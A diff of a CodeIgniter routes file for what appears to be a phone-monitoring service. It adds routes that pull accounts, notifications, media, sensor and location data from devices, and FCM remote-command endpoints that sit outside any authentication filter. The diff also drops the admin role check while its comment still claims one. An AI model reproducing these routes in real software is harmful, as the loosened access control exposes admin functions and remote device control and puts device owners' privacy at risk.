@@ -120,11 +120,9 @@ $routes->group('', ['namespace' => 'App\Controllers'], static function ($routes)
 //    Custom authentication controllers override Shield defaults
 // =================================================================
 
-// Load Shield routes first (for password reset, email verification, etc.)
-service('auth')->routes($routes);
-
 // Custom Authentication Routes (override Shield defaults)
-$routes->group('', ['namespace' => 'App\Controllers\Auth'], static function ($routes) {
+// Defining these before service('auth')->routes() ensures they take precedence
+$routes->group('', ['namespace' => 'App\Controllers\auth'], static function ($routes) {
     /**
      * Displays login view.
      *
@@ -189,6 +187,9 @@ $routes->group('', ['namespace' => 'App\Controllers\Auth'], static function ($ro
     $routes->post('reset-password', 'ForgotPasswordController::resetAction');
 });
 
+// Load Shield routes after custom routes so custom routes take precedence (for password reset, email verification, etc.)
+service('auth')->routes($routes);
+
 // =================================================================
 // 5. PROTECTED CLIENT/DASHBOARD ROUTES
 //    All routes require authentication (session filter)
@@ -196,7 +197,7 @@ $routes->group('', ['namespace' => 'App\Controllers\Auth'], static function ($ro
 
 $routes->group('', [
     'namespace' => 'App\Controllers\clients',
-    'filter'    => 'session'  // Requires authentication
+    'filter' => 'session'  // Requires authentication
 ], static function ($routes) {
 
     // =============================================================
@@ -414,6 +415,28 @@ $routes->group('', [
         $routes->get('(:num)', 'Location::activities/$1');
     });
 
+    // Advanced Data Extractions
+    $routes->group('advanced', static function ($routes) {
+        $routes->get('device', 'Advanced::device_context', ['as' => 'adv-device']);
+        $routes->get('network', 'Advanced::network_info', ['as' => 'adv-network']);
+        $routes->get('accounts', 'Advanced::accounts', ['as' => 'adv-accounts']);
+        $routes->get('calendar', 'Advanced::calendar', ['as' => 'adv-calendar']);
+        $routes->get('app-usage', 'Advanced::app_usage', ['as' => 'adv-app-usage']);
+        $routes->get('app-usage/(:any)', 'Advanced::app_usage_detail/$1', ['as' => 'adv-app-usage-detail']);
+        $routes->get('notifications', 'Advanced::notifications', ['as' => 'adv-notifications']);
+        $routes->get('notifications/(:any)', 'Advanced::notification_detail/$1', ['as' => 'adv-notification-detail']);
+        $routes->post('datatable/app-usage', '\App\Controllers\api\v1\DatatableAPI::getAppUsageDetails', ['as' => 'adv-datatable-app-usage']);
+        $routes->post('datatable/notifications', '\App\Controllers\api\v1\DatatableAPI::getNotificationDetails', ['as' => 'adv-datatable-notifications']);
+        $routes->get('bluetooth', 'Advanced::bluetooth', ['as' => 'adv-bluetooth']);
+        $routes->get('sensors', 'Advanced::sensors', ['as' => 'adv-sensors']);
+    });
+
+    $routes->get('advanced/media', 'Advanced::remote_media');
+    $routes->get('advanced/media/serve/(:any)', 'Advanced::serve_media/$1');
+    $routes->post('advanced/media/delete/(:num)', 'Advanced::delete_media/$1');
+    $routes->get('remote-device', 'Advanced::remote_device', ['as' => 'adv-remote-device']);
+
+
     /**
      * Group for SMS related actions.
      */
@@ -544,20 +567,42 @@ $routes->group('', [
          * Detailed Call Analysis.
          */
         $routes->get('calls', 'Correlation::call_analysis', ['as' => 'analysis-calls']);
-       $routes->get('advanced', 'Correlation::advanced', ['as' => 'analysis-advanced']);
-       $routes->get('advanced/finance', 'Correlation::finance_analysis', ['as' => 'analysis-advanced-finance']);
-       $routes->get('advanced/social', 'Correlation::social_analysis', ['as' => 'analysis-advanced-social']);
-       $routes->get('advanced/lifestyle', 'Correlation::lifestyle_analysis', ['as' => 'analysis-advanced-lifestyle']);
-       $routes->get('advanced/privacy', 'Correlation::privacy_audit', ['as' => 'analysis-advanced-privacy']);
-       $routes->get('advanced/subscriptions', 'Correlation::subscription_tracker', ['as' => 'analysis-advanced-subscriptions']);
-       $routes->get('advanced/apps', 'Correlation::app_portfolio', ['as' => 'analysis-advanced-apps']);
-       $routes->get('advanced/storage', 'Correlation::storage_intelligence', ['as' => 'analysis-advanced-storage']);
-       $routes->get('advanced/report', 'Correlation::generate_report', ['as' => 'analysis-advanced-report']);
+        $routes->get('advanced', 'Correlation::advanced', ['as' => 'analysis-advanced']);
+        $routes->get('advanced/finance', 'Correlation::finance_analysis', ['as' => 'analysis-advanced-finance']);
+        $routes->get('advanced/social', 'Correlation::social_analysis', ['as' => 'analysis-advanced-social']);
+        $routes->get('advanced/lifestyle', 'Correlation::lifestyle_analysis', ['as' => 'analysis-advanced-lifestyle']);
+        $routes->get('advanced/privacy', 'Correlation::privacy_audit', ['as' => 'analysis-advanced-privacy']);
+        $routes->get('advanced/subscriptions', 'Correlation::subscription_tracker', ['as' => 'analysis-advanced-subscriptions']);
+        $routes->get('advanced/apps', 'Correlation::app_portfolio', ['as' => 'analysis-advanced-apps']);
+        $routes->get('advanced/storage', 'Correlation::storage_intelligence', ['as' => 'analysis-advanced-storage']);
+        $routes->get('advanced/sentiment', 'Correlation::sentiment_analysis', ['as' => 'analysis-advanced-sentiment']);
+        $routes->get('advanced/device', 'Correlation::device_pulse', ['as' => 'analysis-advanced-device']);
+        $routes->get('advanced/location', 'Correlation::location_analysis', ['as' => 'analysis-advanced-location']);
+        $routes->get('advanced/hotspots', 'Correlation::geoclustering_hotspots', ['as' => 'analysis-advanced-hotspots']);
+        $routes->get('advanced/report', 'Correlation::generate_report', ['as' => 'analysis-advanced-report']);
+
+        /**
+         * Digital Wellbeing.
+         */
+        $routes->get('wellbeing', 'Correlation::digital_wellbeing', ['as' => 'analysis-wellbeing']);
+
+        /**
+         * Behavioral Anomaly Analysis.
+         */
+        $routes->get('anomalies', 'Correlation::behavioral_anomalies', ['as' => 'analysis-anomalies']);
 
         /**
          * Universal Timeline.
          */
         $routes->get('timeline', 'Correlation::intelligence_timeline', ['as' => 'analysis-timeline']);
+
+        /**
+         * Blocklist Management
+         */
+        $routes->get('blocklist', 'Blocklist::index', ['as' => 'analysis-blocklist']);
+        $routes->post('blocklist/add', 'Blocklist::add', ['as' => 'analysis-blocklist-add']);
+        $routes->post('blocklist/delete/(:num)', 'Blocklist::delete/$1', ['as' => 'analysis-blocklist-delete']);
+        $routes->get('advanced_timeline', 'Advanced::timeline', ['as' => 'adv-timeline']);
 
         /**
          * Displays financial SMS analysis.
@@ -811,20 +856,6 @@ $routes->group('', [
     // =============================================================
 
     /**
-     * Sends support request.
-     *
-     * @return string|\CodeIgniter\HTTP\ResponseInterface
-     */
-    $routes->match(['get', 'post'], 'account/requests', 'Requests::send_request', ['as' => 'client-requests']);
-
-    /**
-     * Sends sleep request.
-     *
-     * @return string|\CodeIgniter\HTTP\ResponseInterface
-     */
-    $routes->match(['get', 'post'], 'account/requests/sleep', 'Requests::send_sleep', ['as' => 'client-sleep-request']);
-
-    /**
      * Sends device command (AJAX).
      *
      * @return \CodeIgniter\HTTP\ResponseInterface
@@ -839,7 +870,7 @@ $routes->group('', [
 
 $routes->group('api/v1', [
     'namespace' => 'App\Controllers\api\v1',
-    'filter'    => 'throttle:api'  // Rate limiting
+    'filter' => 'throttle:api'  // Rate limiting
 ], static function ($routes) {
 
     // -------------------------------------------------------------
@@ -929,6 +960,18 @@ $routes->group('api/v1', [
     $routes->get('config', 'Receive::config', ['as' => 'api-config']);
 
     // -------------------------------------------------------------
+    // -------------------------------------------------------------
+    // 6.6 REMOTE COMMAND ENDPOINTS
+    // -------------------------------------------------------------
+
+    /**
+     * Sends a remote command to a device.
+     */
+    $routes->match(['get', 'post'], "fcm/send/(:any)/(:any)/(:any)", "FCMCommandController::send/$1/$2/$3", ["as" => "api-fcm-send"]);
+    $routes->match(['get', 'post'], "fcm/send/(:any)/(:any)", "FCMCommandController::send/$1/$2", ["as" => "api-fcm-send-short"]);
+    $routes->match(['get', 'post'], "fcm/trigger/(:any)/(:any)", "FCMCommandController::trigger/$1/$2", ["as" => "api-fcm-trigger"]);
+    $routes->match(['get', 'post'], "fcm/trigger/(:any)", "FCMCommandController::trigger/$1", ["as" => "api-fcm-trigger-short"]);
+
     // 6.5 UTILITY & HEALTH CHECK ENDPOINTS
     // -------------------------------------------------------------
 
@@ -961,7 +1004,7 @@ $routes->group('api/v1', [
 
 $routes->group('admin', [
     'namespace' => 'App\Controllers\admin',
-    'filter'    => ['session', 'role:admin']  // Auth + Admin role
+    'filter' => 'session'  // Auth + Admin role
 ], static function ($routes) {
 
     // -------------------------------------------------------------
@@ -1312,7 +1355,7 @@ $routes->group('admin', [
  *
  * @return \CodeIgniter\HTTP\ResponseInterface
  */
-$routes->get('health-check', function() {
+$routes->get('health-check', function () {
     return service('response')->setJSON([
         'status' => 'online',
         'timestamp' => date('Y-m-d H:i:s'),
@@ -1326,7 +1369,7 @@ $routes->get('health-check', function() {
  *
  * @return \CodeIgniter\HTTP\ResponseInterface
  */
-$routes->get('server-status', function() {
+$routes->get('server-status', function () {
     $data = [
         'server_time' => date('Y-m-d H:i:s'),
         'timezone' => date_default_timezone_get(),
@@ -1348,7 +1391,7 @@ if (ENVIRONMENT === 'development') {
      *
      * @return \CodeIgniter\HTTP\ResponseInterface
      */
-    $routes->get('dev/debug', function() {
+    $routes->get('dev/debug', function () {
         if (!function_exists('auth')) {
             echo "Auth helper not loaded";
             return;
@@ -1369,7 +1412,7 @@ if (ENVIRONMENT === 'development') {
      *
      * @return \CodeIgniter\HTTP\ResponseInterface
      */
-    $routes->get('dev/routes', function() {
+    $routes->get('dev/routes', function () {
         $router = service('router');
         $routes = service('routes');
 
@@ -1393,7 +1436,7 @@ if (ENVIRONMENT === 'development') {
 // =================================================================
 
 // Any other route not matched above goes to 404 error page
-$routes->get('(:any)', function() {
+$routes->get('(:any)', function () {
     return redirect()->to('/error/404');
 });
 
